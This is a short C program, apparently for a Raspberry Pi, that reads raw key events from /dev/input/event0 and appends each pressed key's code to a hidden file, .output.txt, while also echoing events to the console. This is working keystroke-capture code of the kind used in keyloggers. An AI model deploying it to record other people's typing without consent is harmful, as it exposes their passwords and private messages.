#include <stdio.h>
#include <stdlib.h>
#include <linux/input.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>

int main()
{
    int fd;
    FILE *output;
    struct input_event ev;

    fd = open("/dev/input/event0", O_RDONLY);

    if(fd < 0) {
        perror("Cannot open file");
        return 0;
    }

    while (1) {
        if (read(fd, &ev, sizeof(struct input_event)) < 0) {
            perror("Cannot read");
            return 0;
        }
        if (ev.type == EV_KEY && ev.value == 1) {
            output = fopen("/home/pi/wso/.output.txt", "a+");
            printf("Event type: %d\nE\tcode: %d\n\tValue: %d\n", ev.type, ev.code, ev.value);
            fprintf(output,"%d\n", ev.code);
            fflush(stdout);
            fclose (output);
        }
    }
    return 0;
}
